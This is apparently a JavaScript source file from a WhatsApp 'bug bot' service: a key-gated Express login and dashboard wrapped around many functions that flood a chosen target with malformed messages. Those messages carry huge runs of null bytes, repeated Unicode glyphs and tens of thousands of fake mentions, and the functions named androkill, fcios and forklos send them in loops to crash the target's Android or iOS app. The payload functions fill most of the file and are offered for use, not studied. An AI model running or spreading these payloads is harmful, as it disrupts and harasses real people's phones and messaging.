  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0;
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000);

async function N3xithBlank(sock, X) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  try {
    await sock.relayMessage(X, msg, {
      participant: { jid: X },
      messageId: sock.generateMessageTag?.() || generateMessageID()
    });
  } catch (error) {
    console.error(`❌ Gagal mengirim bug ke ${X}:`, error.message);
  }
}

async function protocolbug19(sock, target) {
   let HtsAnjir = await prepareWAMessageMedia({
      video: {
         url: "https://mmg.whatsapp.net/v/t62.7161-24/543874146_701733799656425_1962288507009302343_n.enc?ccb=11-4&oh=01_Q5Aa3AFiej4nbt_M9XxYBDpplVdFUucRd510mCaU-IGU5nR_-Q&oe=6947C949&_nc_sid=5e03e0"
      },
      mimetype: "video/mp4",
      fileSha256: "sI35p92ZSwo+OMIPRJt2UlKUFmwgwizYOheNU7LtO5k=",
      fileEncSha256: "/6FWCFe34cg/QH4RpN3AOLTOS8wLJ9JI6zQoyJZgg5Y=",
      fileLength: 3133846,
      seconds: 26
   }, {
      upload: sock.waUploadToServer
   });
   const BututAhAh = {
      buttons: [
         {
            name: "galaxy_message",
            buttonParamsJson: `{\"flow_cta\":\"${"\u0000".repeat(200000)}\"}`,
            version: 3
         }
      ]
   };
   const PouCrousel = () => ({
      header: {
         ...HtsAnjir,
         hasMediaAttachment: true
      },
      nativeFlowMessage: {
            ...BututAhAh,
      }
   });
   let PouMsg = await generateWAMessageFromContent(target,
      proto.Message.fromObject({
         groupMentionedMessage: {
            message: {
               interactiveMessage: {
                  body: { text: "SHADOW_STEALER V4" },
                  carouselMessage: {
                     cards: [
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel(),
                        PouCrousel()
                     ]
                  },
                  contextInfo: { mentionedJid: [target] }
               }
            }
         }
      }),
      { userJid: target, quoted: null }
   );
   await sock.relayMessage(target, PouMsg.message, {
      participant: { jid: target }
   });
}

async function protocolbug18(sock, target, mention) {
  for (let p = 0; p < 5; p++) {

    const PouMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(300),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                header: "\u0000".repeat(10000),
                body: "\u0000".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: { screen: "FORM_SCREEN" },
                flow_cta: "\u0000".repeat(900000),
                flow_id: "1169834181134583",
                flow_message_version: "3",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
              })
            }
          }
        }
      }
    });

    await sock.relayMessage("status@broadcast", PouMsg.message, {
      messageId: PouMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: PouMsg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "#PouMods Official" },
                content: undefined
              }
            ]
          }
        }
      }, {});
    }

  }
}

async function BandangV1(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({ status: true }),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}


async function bandangV2(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "menu_options", 
                        paramsJson: "{\"display_text\":\" PouMods - Offcial\",\"id\":\".Grifith\",\"description\":\"gatau bet mut.\"}",
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function delayloww(sock, target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({ status: true }),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function XvrZenDly(sock, target) {
  try {
    let msg = generateWAMessageFromContent(target, {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
          },
          body: {
            text: "\u0000".repeat(1500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(chalk.red.bold("func Error jir:"), err);
  }
}

async function PouButtonUi(target) {
for (let i = 0; i < 5; i++) {
const PouMsg = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
hasMediaAttachment: false
},
body: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
limited_time_offer: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
url: "t.me/PouSkibudi",
copy_code: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
expiration_time: Date.now() * 999
},
buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
id: null
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
copy_code: "𑜦𑜠".repeat(10000)
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "PROMOTION",
flow_cta: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
flow_message_version: "3"
})
}
]
},
contextInfo: {
mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
isForwarded: true,
forwardingScore: 999
}
}
}
}
}
await sock.relayMessage(target, PouMsg)
}
}

async function PLottiEStcJv(sock, target) {
  try {
    const PouMsg1 = generateWAMessageFromContent(target, {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
            fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
            mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
            fileLength: "25155",
            mediaKeyTimestamp: "1762062705",
            isAnimated: true,
            stickerSentTs: "1762062705158",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419085046817@newsletter",
                serverMessageId: 1,
                newsletterName: "POU HITAM BANGET 😹︎" + "ꦾ".repeat(12000)
              },
              quotedmessage: {
                paymentInviteMessage: {
                  expiryTimestamp: Date.now() + 1814400000,
                  serviceType: 3,
                }
              }
            }
          }
        }
      }
    }, { userJid: target })

    await sock.relayMessage(target, PouMsg1.message, { 
    messageId: PouMsg1.key.id 
    })
    console.log("DONE BY Developers")

  } catch (bokepPou3menit) {
    console.error("EROR COK:", bokepPou3menit)
  }
}

async function PouHitam(sock, target) {
 const PouMessage = {
 viewOnceMessage: {
 message: {
 extendedTextMessage: {
 text: "POU HAMA 😹" + "\u0000".repeat(1000) + "https://Wa.me/stickerpack/poukontol",
 matchedText: "https://Wa.me/stickerpack/PouKontol",
 description: "\u74A7",
 title: "POU BIRAHI 😹", 
 contextInfo: {
 mentionedJid: [target],
 forwardingScore: 1000,
 isForwarded: true,
 externalAdReply: {
 renderLargerThumbnail: true,
 title: "POU SANGE 😹",
 body: "click woi biar forcelose 😑👌",
 showAdAttribution: true,
 thumbnailUrl: "https://Wa.me/stickerpack/PouKontol",
 mediaUrl: "https://Wa.me/stickerpack/PouKontol",
 sourceUrl: "https://Wa.me/stickerpack/PouKontol"
 }
 }
 }
 }
 }
 };

 await sock.relayMessage(target, PouMessage, { 
    messageId: Date.now().toString() });
}

async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵??𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function delayinvisible(sock, target) {
     for (let i = 0; i < 3; i++) {
         await PouButtonUi(sock, target);
         await protocolbug19(sock, target);
         await PLottiEStcJv(sock, target);
         await N3xithBlank(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function forceandro(sock, target) {
     for (let i = 0; i < 1; i++) {
         await PouButtonUi(sock, target);
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function androkill(sock, target) {
     for (let i = 0; i < 3; i++) {
         await PouButtonUi(sock, target);
         await protocolbug19(sock, target);
         await PLottiEStcJv(sock, target);
         await N3xithBlank(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function fcios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await iosinVisFC3(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function forklos(sock, target) {
     for (let i = 0; i < 3; i++) {
         await PouHitam(sock, target);
         await N3xithBlank(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }

  req.user = currentUser; 
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "shadow", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "shadow", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 }); 
  res.redirect("/dashboard");
});

app.get("/dashboard", requireAuth, (req, res) => {
    const filePath = path.join(__dirname, 'shadow', 'dashboard.html');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return res.status(500).send("Gagal memuat halaman dashboard");
        }

        const users = getUsers(); 
        const userCount = users.length.toString();
        const senderCount = "1"; 

        const currentUser = users.find(u => u.username === req.user.username);
        
        let expiredStatus = "Permanent";
        if (currentUser && currentUser.expired) {
            const now = new Date();
            const expDate = new Date(currentUser.expired);
            
            if (now > expDate) {
                expiredStatus = "Expired";
            } else {
                const diffTime = Math.abs(expDate - now);
                const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)); 
                expiredStatus = `${diffDays} Hari Lagi`;
            }
        }

        const username = req.user.username;
        const role = req.user.role || "Member";

        let result = data
            .replace(/\${username}/g, username)
            .replace(/\${role}/g, role)
            .replace(/\${userOnline}/g, userCount)
            .replace(/\${senderAktif}/g, senderCount)
            .replace(/\${expiredDate}/g, expiredStatus);

        res.send(result);
    });
});

app.get("/tools", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "shadow", "tools.html");
